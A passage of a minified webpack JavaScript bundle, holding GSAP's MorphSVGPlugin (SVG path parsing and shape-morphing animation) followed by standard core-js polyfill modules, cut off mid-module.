              (b += 1 * D[r + 3]),
              (w += 1 * D[r + 4]),
              u.push(p, f, b + (2 / 3) * (s - b), w + (2 / 3) * (o - w), b, w),
              (r += 4);
          else if ("T" === a)
            (p = b - u[u.length - 4]),
              (f = w - u[u.length - 3]),
              u.push(
                b + p,
                w + f,
                s + (2 / 3) * (b + 1.5 * p - s),
                o + (2 / 3) * (w + 1.5 * f - o),
                (b = s),
                (w = o)
              ),
              (r += 2);
          else if ("H" === a) C(b, w, (b = s), w), (r += 1);
          else if ("V" === a) C(b, w, b, (w = s + (h ? w - b : 0))), (r += 1);
          else if ("L" === a || "Z" === a)
            "Z" === a && ((s = c), (o = d), (u.closed = !0)),
              ("L" === a || l(b - s) > 0.5 || l(w - o) > 0.5) &&
                (C(b, w, s, o), "L" === a && (r += 2)),
              (b = s),
              (w = o);
          else if ("A" === a) {
            if (
              ((v = D[r + 4]),
              (y = D[r + 5]),
              (p = D[r + 6]),
              (f = D[r + 7]),
              (n = 7),
              v.length > 1 &&
                (v.length < 3
                  ? ((f = p), (p = y), n--)
                  : ((f = y), (p = v.substr(2)), (n -= 2)),
                (y = v.charAt(1)),
                (v = v.charAt(0))),
              (g = m(
                b,
                w,
                +D[r + 1],
                +D[r + 2],
                +D[r + 3],
                +v,
                +y,
                (h ? b : 0) + 1 * p,
                (h ? w : 0) + 1 * f
              )),
              (r += n),
              g)
            )
              for (n = 0; n < g.length; n++) u.push(g[n]);
            (b = u[u.length - 2]), (w = u[u.length - 1]);
          } else console.log(E);
        return (
          (r = u.length) < 6
            ? (x.pop(), (r = 0))
            : u[0] === u[r - 2] && u[1] === u[r - 1] && (u.closed = !0),
          (x.totalPoints = S + r),
          x
        );
      }
      function v(t) {
        c(t[0]) && (t = [t]);
        var e,
          r,
          i,
          n,
          s = "",
          o = t.length;
        for (r = 0; r < o; r++) {
          for (
            n = t[r],
              s += "M" + d(n[0]) + "," + d(n[1]) + " C",
              e = n.length,
              i = 2;
            i < e;
            i++
          )
            s +=
              d(n[i++]) +
              "," +
              d(n[i++]) +
              " " +
              d(n[i++]) +
              "," +
              d(n[i++]) +
              " " +
              d(n[i++]) +
              "," +
              d(n[i]) +
              " ";
          n.closed && (s += "z");
        }
        return s;
      }
      var y,
        D,
        x,
        b,
        w,
        T = function () {
          return (
            y ||
            ("undefined" != typeof window &&
              (y = window.gsap) &&
              y.registerPlugin &&
              y)
          );
        },
        S = function (t) {
          return "function" == typeof t;
        },
        E = Math.atan2,
        C = Math.cos,
        P = Math.sin,
        F = Math.sqrt,
        M = Math.PI,
        R = 2 * M,
        A = 0.3 * M,
        O = 0.7 * M,
        k = /[-+=\.]*\d+[\.e\-\+]*\d*[e\-\+]*\d*/gi,
        L = /(^[#\.][a-z]|[a-y][a-z])/gi,
        B = /[achlmqstvz]/gi,
        z = function (t) {
          return console && console.warn(t);
        },
        I = function (t) {
          var e,
            r = t.length,
            i = 0,
            n = 0;
          for (e = 0; e < r; e++) (i += t[e++]), (n += t[e]);
          return [i / (r / 2), n / (r / 2)];
        },
        j = function (t) {
          var e,
            r,
            i,
            n = t.length,
            s = t[0],
            o = s,
            a = t[1],
            l = a;
          for (i = 6; i < n; i += 6)
            (e = t[i]) > s ? (s = e) : e < o && (o = e),
              (r = t[i + 1]) > a ? (a = r) : r < l && (l = r);
          return (
            (t.centerX = (s + o) / 2),
            (t.centerY = (a + l) / 2),
            (t.size = (s - o) * (a - l))
          );
        },
        V = function (t, e) {
          void 0 === e && (e = 3);
          for (
            var r,
              i,
              n,
              s,
              o,
              a,
              l,
              h,
              u,
              c,
              d,
              p,
              f,
              g,
              m,
              _,
              v = t.length,
              y = t[0][0],
              D = y,
              x = t[0][1],
              b = x,
              w = 1 / e;
            --v > -1;

          )
            for (r = (o = t[v]).length, s = 6; s < r; s += 6)
              for (
                u = o[s],
                  c = o[s + 1],
                  d = o[s + 2] - u,
                  g = o[s + 3] - c,
                  p = o[s + 4] - u,
                  m = o[s + 5] - c,
                  f = o[s + 6] - u,
                  _ = o[s + 7] - c,
                  a = e;
                --a > -1;

              )
                (i =
                  ((l = w * a) * l * f + 3 * (h = 1 - l) * (l * p + h * d)) *
                    l +
                  u) > y
                  ? (y = i)
                  : i < D && (D = i),
                  (n = (l * l * _ + 3 * h * (l * m + h * g)) * l + c) > x
                    ? (x = n)
                    : n < b && (b = n);
          return (
            (t.centerX = (y + D) / 2),
            (t.centerY = (x + b) / 2),
            (t.left = D),
            (t.width = y - D),
            (t.top = b),
            (t.height = x - b),
            (t.size = (y - D) * (x - b))
          );
        },
        N = function (t, e) {
          return e.length - t.length;
        },
        U = function (t, e) {
          var r = t.size || j(t),
            i = e.size || j(e);
          return Math.abs(i - r) < (r + i) / 20
            ? e.centerX - t.centerX || e.centerY - t.centerY
            : i - r;
        },
        W = function (t, e) {
          var r,
            i,
            n = t.slice(0),
            s = t.length,
            o = s - 2;
          for (e |= 0, r = 0; r < s; r++)
            (i = (r + e) % o), (t[r++] = n[i]), (t[r] = n[i + 1]);
        },
        H = function (t, e, r, i, n) {
          var s,
            o,
            a,
            l,
            h = t.length,
            u = 0,
            c = h - 2;
          for (r *= 6, o = 0; o < h; o += 6)
            (l = t[(s = (o + r) % c)] - (e[o] - i)),
              (a = t[s + 1] - (e[o + 1] - n)),
              (u += F(a * a + l * l));
          return u;
        },
        q = function (t, e, r) {
          var i,
            n,
            s,
            o = t.length,
            a = I(t),
            l = I(e),
            h = l[0] - a[0],
            u = l[1] - a[1],
            c = H(t, e, 0, h, u),
            d = 0;
          for (s = 6; s < o; s += 6)
            (n = H(t, e, s / 6, h, u)) < c && ((c = n), (d = s));
          if (r)
            for (p((i = t.slice(0))), s = 6; s < o; s += 6)
              (n = H(i, e, s / 6, h, u)) < c && ((c = n), (d = -s));
          return d / 6;
        },
        X = function (t, e, r) {
          for (
            var i, n, s, o, a, l, h = t.length, u = 1e20, c = 0, d = 0;
            --h > -1;

          )
            for (l = (i = t[h]).length, a = 0; a < l; a += 6)
              (n = i[a] - e),
                (s = i[a + 1] - r),
                (o = F(n * n + s * s)) < u &&
                  ((u = o), (c = i[a]), (d = i[a + 1]));
          return [c, d];
        },
        Y = function (t, e, r, i, n, s) {
          var o,
            a,
            l,
            h,
            u = e.length,
            c = 0,
            d = Math.min(t.size || j(t), e[r].size || j(e[r])) * i,
            p = 1e20,
            f = t.centerX + n,
            g = t.centerY + s;
          for (o = r; o < u && !((e[o].size || j(e[o])) < d); o++)
            (a = e[o].centerX - f),
              (l = e[o].centerY - g),
              (h = F(a * a + l * l)) < p && ((c = o), (p = h));
          return (h = e[c]), e.splice(c, 1), h;
        },
        G = function (t, e) {
          var r,
            i,
            n,
            s,
            o,
            a,
            l,
            h,
            u,
            c,
            d,
            p,
            f,
            g,
            m = 0,
            _ = t.length,
            v = e / ((_ - 2) / 6);
          for (f = 2; f < _; f += 6)
            for (m += v; m > 0.999999; )
              (r = t[f - 2]),
                (i = t[f - 1]),
                (n = t[f]),
                (s = t[f + 1]),
                (o = t[f + 2]),
                (a = t[f + 3]),
                (l = t[f + 4]),
                (h = t[f + 5]),
                (u = r + (n - r) * (g = 1 / ((Math.floor(m) || 1) + 1))),
                (u += ((d = n + (o - n) * g) - u) * g),
                (d += (o + (l - o) * g - d) * g),
                (c = i + (s - i) * g),
                (c += ((p = s + (a - s) * g) - c) * g),
                (p += (a + (h - a) * g - p) * g),
                t.splice(
                  f,
                  4,
                  r + (n - r) * g,
                  i + (s - i) * g,
                  u,
                  c,
                  u + (d - u) * g,
                  c + (p - c) * g,
                  d,
                  p,
                  o + (l - o) * g,
                  a + (h - a) * g
                ),
                (f += 6),
                (_ += 6),
                m--;
          return t;
        },
        K = function (t, e, r, i, n) {
          var s,
            o,
            a,
            l,
            h,
            u,
            c,
            d = e.length - t.length,
            f = d > 0 ? e : t,
            g = d > 0 ? t : e,
            m = 0,
            _ = "complexity" === i ? N : U,
            v = "position" === i ? 0 : "number" == typeof i ? i : 0.8,
            y = g.length,
            D = "object" == typeof r && r.push ? r.slice(0) : [r],
            x = "reverse" === D[0] || D[0] < 0,
            b = "log" === r;
          if (g[0]) {
            if (
              f.length > 1 &&
              (t.sort(_),
              e.sort(_),
              f.size || V(f),
              g.size || V(g),
              (u = f.centerX - g.centerX),
              (c = f.centerY - g.centerY),
              _ === U)
            )
              for (y = 0; y < g.length; y++)
                f.splice(y, 0, Y(g[y], f, y, v, u, c));
            if (d)
              for (
                d < 0 && (d = -d),
                  f[0].length > g[0].length &&
                    G(g[0], ((f[0].length - g[0].length) / 6) | 0),
                  y = g.length;
                m < d;

              )
                f[y].size || j(f[y]),
                  (l = (a = X(g, f[y].centerX, f[y].centerY))[0]),
                  (h = a[1]),
                  (g[y++] = [l, h, l, h, l, h, l, h]),
                  (g.totalPoints += 8),
                  m++;
            for (y = 0; y < t.length; y++)
              (s = e[y]),
                (o = t[y]),
                (d = s.length - o.length) < 0
                  ? G(s, (-d / 6) | 0)
                  : d > 0 && G(o, (d / 6) | 0),
                x && !1 !== n && !o.reversed && p(o),
                (r = D[y] || 0 === D[y] ? D[y] : "auto") &&
                  (o.closed ||
                  (Math.abs(o[0] - o[o.length - 2]) < 0.5 &&
                    Math.abs(o[1] - o[o.length - 1]) < 0.5)
                    ? "auto" === r || "log" === r
                      ? ((D[y] = r = q(o, s, !y || !1 === n)),
                        r < 0 && ((x = !0), p(o), (r = -r)),
                        W(o, 6 * r))
                      : "reverse" !== r &&
                        (y && r < 0 && p(o), W(o, 6 * (r < 0 ? -r : r)))
                    : !x &&
                      (("auto" === r &&
                        Math.abs(s[0] - o[0]) +
                          Math.abs(s[1] - o[1]) +
                          Math.abs(s[s.length - 2] - o[o.length - 2]) +
                          Math.abs(s[s.length - 1] - o[o.length - 1]) >
                          Math.abs(s[0] - o[o.length - 2]) +
                            Math.abs(s[1] - o[o.length - 1]) +
                            Math.abs(s[s.length - 2] - o[0]) +
                            Math.abs(s[s.length - 1] - o[1])) ||
                        r % 2)
                    ? (p(o), (D[y] = -1), (x = !0))
                    : "auto" === r
                    ? (D[y] = 0)
                    : "reverse" === r && (D[y] = -1),
                  o.closed !== s.closed && (o.closed = s.closed = !1));
            return (
              b && z("shapeIndex:[" + D.join(",") + "]"), (t.shapeIndex = D), D
            );
          }
        },
        Q = function (t, e) {
          var r,
            i,
            n,
            s,
            o,
            a,
            l,
            h = 0,
            u = parseFloat(t[0]),
            c = parseFloat(t[1]),
            d = u + "," + c + " ";
          for (
            r = (0.5 * e) / (0.5 * (n = t.length) - 1), i = 0;
            i < n - 2;
            i += 2
          ) {
            if (
              ((h += r),
              (a = parseFloat(t[i + 2])),
              (l = parseFloat(t[i + 3])),
              h > 0.999999)
            )
              for (o = 1 / (Math.floor(h) + 1), s = 1; h > 0.999999; )
                (d +=
                  (u + (a - u) * o * s).toFixed(2) +
                  "," +
                  (c + (l - c) * o * s).toFixed(2) +
                  " "),
                  h--,
                  s++;
            (d += a + "," + l + " "), (u = a), (c = l);
          }
          return d;
        },
        Z = function (t) {
          var e = t[0].match(k) || [],
            r = t[1].match(k) || [],
            i = r.length - e.length;
          i > 0 ? (t[0] = Q(e, i)) : (t[1] = Q(r, -i));
        },
        J = function (t, e) {
          for (
            var r,
              i,
              n,
              s,
              o,
              a,
              l,
              h,
              u,
              c,
              d,
              p,
              f = t.length,
              g = 0.2 * (e || 1);
            --f > -1;

          ) {
            for (
              d = (i = t[f]).isSmooth = i.isSmooth || [0, 0, 0, 0],
                p = i.smoothData = i.smoothData || [0, 0, 0, 0],
                d.length = 4,
                h = i.length - 2,
                l = 6;
              l < h;
              l += 6
            )
              (n = i[l] - i[l - 2]),
                (s = i[l + 1] - i[l - 1]),
                (o = i[l + 2] - i[l]),
                (a = i[l + 3] - i[l + 1]),
                (u = E(s, n)),
                (c = E(a, o)),
                (r = Math.abs(u - c) < g) &&
                  ((p[l - 2] = u),
                  (p[l + 2] = c),
                  (p[l - 1] = F(n * n + s * s)),
                  (p[l + 3] = F(o * o + a * a))),
                d.push(r, r, 0, 0, r, r);
            i[h] === i[0] &&
              i[h + 1] === i[1] &&
              ((n = i[0] - i[h - 2]),
              (s = i[1] - i[h - 1]),
              (o = i[2] - i[0]),
              (a = i[3] - i[1]),
              (u = E(s, n)),
              (c = E(a, o)),
              Math.abs(u - c) < g &&
                ((p[h - 2] = u),
                (p[2] = c),
                (p[h - 1] = F(n * n + s * s)),
                (p[3] = F(o * o + a * a)),
                (d[h - 2] = d[h - 1] = !0)));
          }
          return t;
        },
        tt = function (t) {
          var e = t.trim().split(" ");
          return {
            x:
              (~t.indexOf("left")
                ? 0
                : ~t.indexOf("right")
                ? 100
                : isNaN(parseFloat(e[0]))
                ? 50
                : parseFloat(e[0])) / 100,
            y:
              (~t.indexOf("top")
                ? 0
                : ~t.indexOf("bottom")
                ? 100
                : isNaN(parseFloat(e[1]))
                ? 50
                : parseFloat(e[1])) / 100,
          };
        },
        et =
          "Use MorphSVGPlugin.convertToPath() to convert to a path before morphing.",
        rt = function (t, e, r, i) {
          var n,
            s,
            o,
            a = this._origin,
            l = this._eOrigin,
            h = t[r] - a.x,
            u = t[r + 1] - a.y,
            c = F(h * h + u * u),
            d = E(u, h);
          return (
            (h = e[r] - l.x),
            (u = e[r + 1] - l.y),
            (s = (o = n = E(u, h) - d) !== o % M ? o + (o < 0 ? R : -R) : o),
            !i && x && Math.abs(s + x.ca) < A && (i = x),
            (this._anchorPT = x =
              {
                _next: this._anchorPT,
                t: t,
                sa: d,
                ca: i && s * i.ca < 0 && Math.abs(s) > O ? n : s,
                sl: c,
                cl: F(h * h + u * u) - c,
                i: r,
              })
          );
        },
        it = function (t) {
          (y = T()),
            (w = w || (y && y.plugins.morphSVG)),
            y && w
              ? ((D = y.utils.toArray),
                (w.prototype._tweenRotation = rt),
                (b = 1))
              : t && z("Please gsap.registerPlugin(MorphSVGPlugin)");
        },
        nt = {
          version: "3.5.1",
          name: "morphSVG",
          rawVars: 1,
          register: function (t, e) {
            (y = t), (w = e), it();
          },
          init: function (t, e, r, i, n) {
            if ((b || it(1), !e)) return z("invalid shape"), !1;
            var s,
              o,
              a,
              l,
              h,
              u,
              c,
              d,
              p,
              f,
              m,
              y,
              w,
              T,
              E,
              C,
              P,
              F,
              M,
              R,
              A,
              O;
            if (
              (S(e) && (e = e.call(r, i, t, n)),
              "string" == typeof e || e.getBBox || e[0])
            )
              e = { shape: e };
            else if ("object" == typeof e) {
              for (o in ((s = {}), e))
                s[o] = S(e[o]) && "render" !== o ? e[o].call(r, i, t, n) : e[o];
              e = s;
            }
            var I = t.nodeType ? window.getComputedStyle(t) : {},
              j = I.fill + "",
              N = !(
                "none" === j ||
                "0" === (j.match(k) || [])[3] ||
                "evenodd" === I.fillRule
              ),
              U = (e.origin || "50 50").split(",");
            if (
              ((h =
                "POLYLINE" === (s = (t.nodeName + "").toUpperCase()) ||
                "POLYGON" === s),
              "PATH" !== s && !h && !e.prop)
            )
              return z("Cannot morph a <" + s + "> element. " + et), !1;
            if (
              ((o = "PATH" === s ? "d" : "points"),
              !e.prop && !S(t.setAttribute))
            )
              return !1;
            if (
              ((l = (function (t, e, r) {
                var i, n;
                return (
                  (!("string" == typeof t) ||
                    L.test(t) ||
                    (t.match(k) || []).length < 3) &&
                    ((i = D(t)[0])
                      ? ((n = (i.nodeName + "").toUpperCase()),
                        e && "PATH" !== n && ((i = g(i, !1)), (n = "PATH")),
                        (t =
                          i.getAttribute("PATH" === n ? "d" : "points") || ""),
                        i === r &&
                          (t = i.getAttributeNS(null, "data-original") || t))
                      : (z("WARNING: invalid morph to: " + t), (t = !1))),
                  t
                );
              })(e.shape || e.d || e.points || "", "d" === o, t)),
              h && B.test(l))
            )
              return z("A <" + s + "> cannot accept path data. " + et), !1;
            if (
              ((u = e.shapeIndex || 0 === e.shapeIndex ? e.shapeIndex : "auto"),
              (c = e.map || nt.defaultMap),
              (this._prop = e.prop),
              (this._render = e.render || nt.defaultRender),
              (this._apply =
                "updateTarget" in e ? e.updateTarget : nt.defaultUpdateTarget),
              (this._rnd = Math.pow(10, isNaN(e.precision) ? 2 : +e.precision)),
              (this._tween = r),
              l)
            ) {
              if (
                ((this._target = t),
                (P = "object" == typeof e.precompile),
                (f = this._prop ? t[this._prop] : t.getAttribute(o)),
                this._prop ||
                  t.getAttributeNS(null, "data-original") ||
                  t.setAttributeNS(null, "data-original", f),
                "d" === o || this._prop)
              ) {
                if (
                  ((f = _(P ? e.precompile[0] : f)),
                  (m = _(P ? e.precompile[1] : l)),
                  !P && !K(f, m, u, c, N))
                )
                  return !1;
                for (
                  ("log" !== e.precompile && !0 !== e.precompile) ||
                    z('precompile:["' + v(f) + '","' + v(m) + '"]'),
                    (A = "linear" !== (e.type || nt.defaultType)) &&
                      ((f = J(f, e.smoothTolerance)),
                      (m = J(m, e.smoothTolerance)),
                      f.size || V(f),
                      m.size || V(m),
                      (R = tt(U[0])),
                      (this._origin = f.origin =
                        {
                          x: f.left + R.x * f.width,
                          y: f.top + R.y * f.height,
                        }),
                      U[1] && (R = tt(U[1])),
                      (this._eOrigin = {
                        x: m.left + R.x * m.width,
                        y: m.top + R.y * m.height,
                      })),
                    this._rawPath = t._gsRawPath = f,
                    w = f.length;
                  --w > -1;

                )
                  for (
                    E = f[w],
                      C = m[w],
                      d = E.isSmooth || [],
                      p = C.isSmooth || [],
                      T = E.length,
                      x = 0,
                      y = 0;
                    y < T;
                    y += 2
                  )
                    (C[y] === E[y] && C[y + 1] === E[y + 1]) ||
                      (A
                        ? d[y] && p[y]
                          ? ((F = E.smoothData),
                            (M = C.smoothData),
                            (O = y + (y === T - 4 ? 7 - T : 5)),
                            (this._controlPT = {
                              _next: this._controlPT,
                              i: y,
                              j: w,
                              l1s: F[y + 1],
                              l1c: M[y + 1] - F[y + 1],
                              l2s: F[O],
                              l2c: M[O] - F[O],
                            }),
                            (a = this._tweenRotation(E, C, y + 2)),
                            this._tweenRotation(E, C, y, a),
                            this._tweenRotation(E, C, O - 1, a),
                            (y += 4))
                          : this._tweenRotation(E, C, y)
                        : ((a = this.add(E, y, E[y], C[y])),
                          (a = this.add(E, y + 1, E[y + 1], C[y + 1]) || a)));
              } else
                a = this.add(
                  t,
                  "setAttribute",
                  t.getAttribute(o) + "",
                  l + "",
                  i,
                  n,
                  0,
                  (function (t) {
                    return isNaN(t)
                      ? Z
                      : function (e) {
                          Z(e),
                            (e[1] = (function (t, e) {
                              if (!e) return t;
                              var r,
                                i,
                                n,
                                s = t.match(k) || [],
                                o = s.length,
                                a = "";
                              for (
                                "reverse" === e
                                  ? ((i = o - 1), (r = -2))
                                  : ((i =
                                      (2 * (parseInt(e, 10) || 0) +
                                        1 +
                                        100 * o) %
                                      o),
                                    (r = 2)),
                                  n = 0;
                                n < o;
                                n += 2
                              )
                                (a += s[i - 1] + "," + s[i] + " "),
                                  (i = (i + r) % o);
                              return a;
                            })(e[1], parseInt(t, 10)));
                        };
                  })(u),
                  o
                );
              A &&
                (this.add(this._origin, "x", this._origin.x, this._eOrigin.x),
                (a = this.add(
                  this._origin,
                  "y",
                  this._origin.y,
                  this._eOrigin.y
                ))),
                a &&
                  (this._props.push("morphSVG"), (a.end = l), (a.endProp = o));
            }
            return 1;
          },
          render: function (t, e) {
            for (
              var r,
                i,
                n,
                s,
                o,
                a,
                l,
                h,
                u,
                c,
                d,
                p,
                f = e._rawPath,
                g = e._controlPT,
                m = e._anchorPT,
                _ = e._rnd,
                v = e._target,
                y = e._pt;
              y;

            )
              y.r(t, y.d), (y = y._next);
            if (1 === t && e._apply)
              for (y = e._pt; y; )
                y.end &&
                  (e._prop
                    ? (v[e._prop] = y.end)
                    : v.setAttribute(y.endProp, y.end)),
                  (y = y._next);
            else if (f) {
              for (; m; )
                (o = m.sa + t * m.ca),
                  (s = m.sl + t * m.cl),
                  (m.t[m.i] = e._origin.x + C(o) * s),
                  (m.t[m.i + 1] = e._origin.y + P(o) * s),
                  (m = m._next);
              for (i = t < 0.5 ? 2 * t * t : (4 - 2 * t) * t - 1; g; )
                (p =
                  (a = g.i) +
                  (a === (n = f[g.j]).length - 4 ? 7 - n.length : 5)),
                  (o = E(n[p] - n[a + 1], n[p - 1] - n[a])),
                  (c = P(o)),
                  (d = C(o)),
                  (h = n[a + 2]),
                  (u = n[a + 3]),
                  (s = g.l1s + i * g.l1c),
                  (n[a] = h - d * s),
                  (n[a + 1] = u - c * s),
                  (s = g.l2s + i * g.l2c),
                  (n[p - 1] = h + d * s),
                  (n[p] = u + c * s),
                  (g = g._next);
              if (((v._gsRawPath = f), e._apply)) {
                for (r = "", l = 0; l < f.length; l++)
                  for (
                    s = (n = f[l]).length,
                      r +=
                        "M" +
                        ((n[0] * _) | 0) / _ +
                        " " +
                        ((n[1] * _) | 0) / _ +
                        " C",
                      a = 2;
                    a < s;
                    a++
                  )
                    r += ((n[a] * _) | 0) / _ + " ";
                e._prop ? (v[e._prop] = r) : v.setAttribute("d", r);
              }
            }
            e._render && f && e._render.call(e._tween, f, v);
          },
          kill: function (t) {
            this._pt = this._rawPath = 0;
          },
          getRawPath: function (t) {
            var e,
              r = (t = (u(t) && n.test(t) && document.querySelector(t)) || t)
                .getAttribute
                ? t
                : 0;
            return r && (t = t.getAttribute("d"))
              ? (r._gsPath || (r._gsPath = {}),
                (e = r._gsPath[t]) && !e._dirty ? e : (r._gsPath[t] = _(t)))
              : t
              ? u(t)
                ? _(t)
                : c(t[0])
                ? [t]
                : t
              : console.warn(
                  "Expecting a <path> element or an SVG path data string"
                );
          },
          stringToRawPath: _,
          rawPathToString: v,
          pathFilter: function (t, e, r, i, n) {
            var s = _(t[0]),
              o = _(t[1]);
            K(s, o, e || 0 === e ? e : "auto", r, n) &&
              ((t[0] = v(s)),
              (t[1] = v(o)),
              ("log" !== i && !0 !== i) ||
                z('precompile:["' + t[0] + '","' + t[1] + '"]'));
          },
          pointsFilter: Z,
          getTotalSize: V,
          equalizeSegmentQuantity: K,
          convertToPath: function (t, e) {
            return D(t).map(function (t) {
              return g(t, !1 !== e);
            });
          },
          defaultType: "linear",
          defaultUpdateTarget: !0,
          defaultMap: "size",
        };
      T() && y.registerPlugin(nt),
        (t.MorphSVGPlugin = nt),
        (t.default = nt),
        Object.defineProperty(t, "__esModule", { value: !0 });
    })(e);
  },
  function (t, e, r) {
    r(107), (t.exports = r(106));
  },
  function (t, e, r) {
    var i = r(1),
      n = r(52),
      s = i.WeakMap;
    t.exports = "function" == typeof s && /native code/.test(n(s));
  },
  function (t, e, r) {
    var i = r(17),
      n = r(33),
      s = r(57),
      o = r(9);
    t.exports =
      i("Reflect", "ownKeys") ||
      function (t) {
        var e = n.f(o(t)),
          r = s.f;
        return r ? e.concat(r(t)) : e;
      };
  },
  function (t, e, r) {
    var i = r(13),
      n = r(34),
      s = r(85),
      o = function (t) {
        return function (e, r, o) {
          var a,
            l = i(e),
            h = n(l.length),
            u = s(o, h);
          if (t && r != r) {
            for (; h > u; ) if ((a = l[u++]) != a) return !0;
          } else
            for (; h > u; u++)
              if ((t || u in l) && l[u] === r) return t || u || 0;
          return !t && -1;
        };
      };
    t.exports = { includes: o(!0), indexOf: o(!1) };
  },
  function (t, e, r) {
    var i = r(35),
      n = Math.max,
      s = Math.min;
    t.exports = function (t, e) {
      var r = i(t);
      return r < 0 ? n(r + e, 0) : s(r, e);
    };
  },
  function (t, e, r) {
    var i = r(2),
      n = /#|\.prototype\./,
      s = function (t, e) {
        var r = a[o(t)];
        return r == h || (r != l && ("function" == typeof e ? i(e) : !!e));
      },
      o = (s.normalize = function (t) {
        return String(t).replace(n, ".").toLowerCase();
      }),
      a = (s.data = {}),
      l = (s.NATIVE = "N"),
      h = (s.POLYFILL = "P");
    t.exports = s;
  },
  function (t, e, r) {
    var i = r(11),
      n = r(8),
      s = r(9),
      o = r(59);
    t.exports = i
      ? Object.defineProperties
      : function (t, e) {
          s(t);
          for (var r, i = o(e), a = i.length, l = 0; a > l; )
            n.f(t, (r = i[l++]), e[r]);
          return t;
        };
  },
  function (t, e, r) {
    var i = r(17);
    t.exports = i("document", "documentElement");
  },
  function (t, e, r) {
    var i = r(13),
      n = r(33).f,
      s = {}.toString,
      o =
        "object" == typeof window && window && Object.getOwnPropertyNames
          ? Object.getOwnPropertyNames(window)
          : [];
    t.exports.f = function (t) {
      return o && "[object Window]" == s.call(t)
        ? (function (t) {
            try {
              return n(t);
            } catch (t) {
              return o.slice();
            }
          })(t)
        : n(i(t));
    };
  },
  function (t, e, r) {
    var i = r(39);
    t.exports = function (t, e, r) {
      if ((i(t), void 0 === e)) return t;
      switch (r) {
        case 0:
          return function () {
            return t.call(e);
          };
        case 1:
          return function (r) {
            return t.call(e, r);
          };
        case 2:
          return function (r, i) {
            return t.call(e, r, i);
          };
        case 3:
          return function (r, i, n) {
            return t.call(e, r, i, n);
          };
      }
      return function () {
        return t.apply(e, arguments);
      };
    };
  },
  function (t, e, r) {
    var i = r(4),
      n = r(25),
      s = r(8),
      o = i("unscopables"),
      a = Array.prototype;
    null == a[o] && s.f(a, o, { configurable: !0, value: n(null) }),
      (t.exports = function (t) {
        a[o][t] = !0;
      });
  },
  function (t, e, r) {
    "use strict";
    var i = r(67).IteratorPrototype,
      n = r(25),
      s = r(15),
      o = r(38),
      a = r(41),
      l = function () {
        return this;
      };
    t.exports = function (t, e, r) {
      var h = e + " Iterator";
      return (
        (t.prototype = n(i, { next: s(1, r) })), o(t, h, !1, !0), (a[h] = l), t
      );
    };
  },
  function (t, e, r) {
    var i = r(9),
      n = r(94);
    t.exports =
      Object.setPrototypeOf ||
      ("__proto__" in {}
        ? (function () {
            var t,
              e = !1,
              r = {};
            try {
              (t = Object.getOwnPropertyDescriptor(
                Object.prototype,
                "__proto__"
              ).set).call(r, []),
                (e = r instanceof Array);
            } catch (t) {}
            return function (r, s) {
              return i(r), n(s), e ? t.call(r, s) : (r.__proto__ = s), r;
            };
          })()
        : void 0);
  },
  function (t, e, r) {
    var i = r(5);
    t.exports = function (t) {
      if (!i(t) && null !== t)
        throw TypeError("Can't set " + String(t) + " as a prototype");
      return t;
    };
  },
  function (t, e, r) {
    "use strict";
    var i = r(43),
      n = r(96);
    t.exports = i
      ? {}.toString
      : function () {
          return "[object " + n(this) + "]";
        };
  },
  function (t, e, r) {
    var i = r(43),
      n = r(28),
      s = r(4)("toStringTag"),
      o =
        "Arguments" ==
        n(
          (function () {
            return arguments;
          })()
        );
    t.exports = i
      ? n
      : function (t) {
          var e, r, i;
          return void 0 === t
            ? "Undefined"
            : null === t
            ? "Null"
            : "string" ==
              typeof (r = (function (t, e) {
                try {
                  return t[e];
                } catch (t) {}
              })((e = Object(t)), s))
            ? r
            : o
            ? n(e)
            : "Object" == (i = n(e)) && "function" == typeof e.callee
            ? "Arguments"
            : i;
        };
  },
  function (t, e, r) {
    "use strict";
    var i = r(39),
      n = r(5),
      s = [].slice,
      o = {},
      a = function (t, e, r) {
        if (!(e in o)) {
          for (var i = [], n = 0; n < e; n++) i[n] = "a[" + n + "]";
          o[e] = Function("C,a", "return new C(" + i.join(",") + ")");
        }
        return o[e](t, r);
      };
    t.exports =
      Function.bind ||
      function (t) {
        var e = i(this),
          r = s.call(arguments, 1),
          o = function () {
            var i = r.concat(s.call(arguments));
            return this instanceof o ? a(e, i.length, i) : e.apply(t, i);
          };
        return n(e.prototype) && (o.prototype = e.prototype), o;
      };
  },
  function (t, e, r) {
    "use strict";
    var i = r(9);
    t.exports = function () {
      var t = i(this),
        e = "";
      return (
        t.global && (e += "g"),
        t.ignoreCase && (e += "i"),
        t.multiline && (e += "m"),
        t.dotAll && (e += "s"),
        t.unicode && (e += "u"),
        t.sticky && (e += "y"),
        e
      );
    };
  },
  function (t, e, r) {
    var i = r(35),
      n = r(29),
      s = function (t) {
        return function (e, r) {
          var s,
            o,
            a = String(n(e)),
            l = i(r),
            h = a.length;
          return l < 0 || l >= h
            ? t
              ? ""
              : void 0
            : (s = a.charCodeAt(l)) < 55296 ||
              s > 56319 ||
              l + 1 === h ||
              (o = a.charCodeAt(l + 1)) < 56320 ||
              o > 57343
            ? t
              ? a.charAt(l)
              : s
            : t
            ? a.slice(l, l + 2)
            : o - 56320 + ((s - 55296) << 10) + 65536;
        };
      };
    t.exports = { codeAt: s(!1), charAt: s(!0) };
  },
  function (t, e, r) {
    "use strict";
    var i = r(2);
    t.exports = function (t, e) {
      var r = [][t];
      return (
        !!r &&
        i(function () {
          r.call(
            null,
            e ||
              function () {
                throw 1;
              },
            1
          );
        })
      );
    };
  },
  function (t, e, r) {
    var i = r(11),
      n = r(2),
      s = r(3),
      o = Object.defineProperty,
      a = {},
      l = function (t) {
        throw t;
      };
    t.exports = function (t, e) {
      if (s(a, t)) return a[t];
      e || (e = {});
      var r = [][t],
        h = !!s(e, "ACCESSORS") && e.ACCESSORS,
        u = s(e, 0) ? e[0] : l,
        c = s(e, 1) ? e[1] : void 0;
      return (a[t] =
        !!r &&
        !n(function () {
          if (h && !i) return !0;
          var t = { length: -1 };
          h ? o(t, 1, { enumerable: !0, get: l }) : (t[1] = 1), r.call(t, u, c);
        }));
    };
  },
  function (t, e, r) {
    "use strict";
    var i = r(10),
      n = r(24),
      s = [].reverse,
      o = [1, 2];
    i(
      { target: "Array", proto: !0, forced: String(o) === String(o.reverse()) },
      {
        reverse: function () {
          return n(this) && (this.length = this.length), s.call(this);
        },
      }
    );
  },
  function (t, e, r) {
    "use strict";
    var i = r(19),
      n = r(8),
      s = r(15);
    t.exports = function (t, e, r) {
      var o = i(e);
      o in t ? n.f(t, o, s(0, r)) : (t[o] = r);
    };
  },
  function (t, e, r) {
    var i = r(2),
      n = r(4),
      s = r(78),
      o = n("species");
